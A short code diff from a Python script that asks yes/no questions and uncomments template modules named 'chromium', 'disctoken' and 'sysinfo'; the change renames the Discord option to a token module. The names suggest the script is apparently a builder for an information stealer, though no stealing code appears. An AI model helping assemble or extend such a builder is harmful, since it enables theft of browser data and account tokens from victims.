@@ -66,7 +66,7 @@ def main() -> None:
     if use_chromium.lower() == "y":
         content = content.replace("# chromium", "chromium")
     if use_discord.lower() == "y":
-        content = content.replace("# discord", "discord")
+        content = content.replace("# disctoken", "disctoken")
     if use_sysinfo.lower() == "y":
         content = content.replace("# sysinfo", "sysinfo")
         
